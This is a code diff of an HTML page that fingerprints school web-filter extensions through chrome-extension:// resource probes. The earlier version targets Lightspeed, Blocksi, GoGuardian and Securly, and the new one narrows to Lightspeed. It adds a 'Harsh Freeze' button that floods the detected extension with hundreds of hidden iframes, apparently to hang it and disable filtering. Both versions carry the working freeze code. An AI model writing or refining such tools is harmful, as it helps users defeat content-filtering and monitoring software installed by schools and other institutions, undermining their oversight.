@@ -1,94 +1,54 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Extension Detector + Harsh Freeze</title>
+  <title>Lightspeed Detector + Freeze</title>
   <style>
     body { font-family: sans-serif; background: #111; color: white; padding: 2rem; }
     button { margin-top: 10px; padding: 10px; background: red; color: white; border: none; cursor: pointer; }
-    ul { list-style: none; padding: 0; }
+    #result { margin-top: 1em; }
   </style>
 </head>
 <body>
-  <h2>🎯 Extension Detection</h2>
-  <p>Detected Extensions:</p>
+  <h2>🔍 Detecting Lightspeed Filter Agent...</h2>
   <ul id="result"></ul>
-
   <button onclick="triggerFreeze()">🔥 Harsh Freeze Lightspeed</button>
 
   <script>
-    const knownExtensions = [
-      {
-        key: "lightspeedfilteragent",
-        name: "Lightspeed Filter Agent",
-        id: "ehnniokiiebpinnfegpkdlcamgdcaaje",
-        testPath: "icon-128.png"
-      },
-      {
-        key: "blocksi",
-        name: "Blocksi Web Filter",
-        id: "ghlpmldmjjhmdgmneoaibbegkjjbonbk",
-        testPath: "icon-128.png"
-      },
-      {
-        key: "goguardian",
-        name: "GoGuardian",
-        id: "haldlgldplgnggkjaafhelgiaglafanh",
-        testPath: "icon-128.png"
-      },
-      {
-        key: "securly",
-        name: "Securly SmartPac",
-        id: "joflmkccibkooplaeoinecjbmdebglab",
-        testPath: "icon-128.png"
-      }
-    ];
+    const extensionId = "ehnniokiiebpinnfegpkdlcamgdcaaje"; // Lightspeed ID
+    const testPaths = ["icon-128.png", "manifest.json", "background.js"];
 
     const resultBox = document.getElementById('result');
-    const detected = [];
+    let lightspeedDetected = false;
 
-    async function checkExtension(id, path) {
-      return new Promise((resolve) => {
-        const img = new Image();
-        img.src = `chrome-extension://${id}/${path}?${Math.random()}`;
-        img.onload = () => resolve(true);
-        img.onerror = () => resolve(false);
-      });
-    }
+    async function checkLightspeed() {
+      for (const path of testPaths) {
+        const found = await new Promise(resolve => {
+          const img = new Image();
+          img.src = `chrome-extension://${extensionId}/${path}?${Math.random()}`;
+          img.onload = () => resolve(true);
+          img.onerror = () => resolve(false);
+        });
 
-    async function detectExtensions() {
-      for (const ext of knownExtensions) {
-        const found = await checkExtension(ext.id, ext.testPath);
         if (found) {
-          detected.push(ext);
-          const li = document.createElement('li');
-          li.textContent = `✅ ${ext.name}`;
-          resultBox.appendChild(li);
+          lightspeedDetected = true;
+          resultBox.innerHTML = `<li>✅ Lightspeed Filter Agent detected!</li>`;
+          return;
         }
       }
 
-      if (detected.length === 0) {
-        const li = document.createElement('li');
-        li.textContent = "❌ No supported extensions detected.";
-        resultBox.appendChild(li);
-      }
+      resultBox.innerHTML = `<li>❌ Lightspeed not found.</li>`;
     }
 
     function triggerFreeze() {
-      if (detected.length === 0) {
-        alert("No extensions found to freeze.");
+      if (!lightspeedDetected) {
+        alert("Lightspeed not detected. Can't freeze.");
         return;
       }
 
-      for (const ext of detected) {
-        harshFreeze(ext.id);
-      }
-    }
-
-    function harshFreeze(extensionId) {
       let count = 0;
       const max = 500;
       const delay = 1;
-      const targets = ["background.js", "popup.html", "manifest.json", "icon-128.png"];
+      const files = ["background.js", "popup.html", "manifest.json", "icon-128.png"];
 
       const interval = setInterval(() => {
         if (count >= max) {
@@ -102,20 +62,17 @@
         iframe.style.position = 'absolute';
         iframe.style.left = '-9999px';
 
-        const file = targets[Math.floor(Math.random() * targets.length)];
-        iframe.src = `chrome-extension://${extensionId}/${file}?r=${Math.random()}`;
+        const file = files[Math.floor(Math.random() * files.length)];
+        iframe.src = `chrome-extension://${extensionId}/${file}?id=${Math.random()}`;
 
         document.body.appendChild(iframe);
-
-        setTimeout(() => {
-          if (iframe.parentElement) iframe.remove();
-        }, 1500);
+        setTimeout(() => iframe.remove(), 1500);
 
         count++;
       }, delay);
     }
 
-    detectExtensions();
+    checkLightspeed();
   </script>
 </body>
 </html>
